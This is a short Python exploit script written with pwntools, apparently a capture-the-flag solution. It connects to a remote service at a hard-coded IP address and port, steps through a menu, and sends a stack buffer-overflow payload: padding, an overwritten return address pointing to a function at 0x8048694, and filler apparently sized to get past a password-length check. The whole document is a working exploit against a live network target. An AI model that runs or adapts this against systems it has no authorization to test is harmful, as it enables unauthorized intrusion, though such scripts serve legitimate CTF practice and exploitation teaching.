from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 56304)
#sh = gdb.debug('./pwn')
context.binary = './pwn'
e = ELF('./pwn')
context.log_level = 'debug'

_execute_addr = 0x8048694

sh.recv()
sh.sendline(b'1')

sh.recv()

payload = b'a'*(0x14+4) + p32(_execute_addr) + b'a'*(4+256-4-4-0x14)

sh.sendline(b'a')

sh.recvuntil(b'passwd:\n')

sh.sendline(payload)
print(sh.recvall())
